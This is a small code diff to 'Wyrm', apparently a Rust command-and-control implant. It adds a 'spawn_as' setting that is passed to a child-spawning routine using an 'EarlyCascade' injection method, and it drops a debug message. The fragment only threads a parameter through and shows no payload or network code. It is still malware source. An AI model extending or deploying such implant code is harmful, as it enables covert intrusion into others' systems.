@@ -75,6 +75,7 @@ pub struct Wyrm {
     pub first_connection_retries: RetriesBeforeExit,
     #[allow(unused)]
     mutex: WyrmMutex,
+    spawn_as: String,
 }
 
 /// The C2 configuration settings for the implant; there can be any number of these
@@ -103,6 +104,7 @@ impl Wyrm {
             agent_name_by_operator,
             jitter,
             mutex,
+            spawn_as,
         ) = translate_build_artifacts();
 
         let mutex = match WyrmMutex::new(&mutex) {
@@ -139,6 +141,7 @@ impl Wyrm {
             },
             agent_name_by_operator,
             mutex,
+            spawn_as,
         }
     }
 
@@ -341,12 +344,7 @@ impl Wyrm {
                         continue;
                     };
 
-                    print_info(format!(
-                        "Spawning child from buffer with len: {}",
-                        buf.len()
-                    ));
-
-                    Spawn::spawn_child(buf, SpawnMethod::EarlyCascade);
+                    Spawn::spawn_child(buf, SpawnMethod::EarlyCascade, &self.spawn_as);
                 }
             }
         }
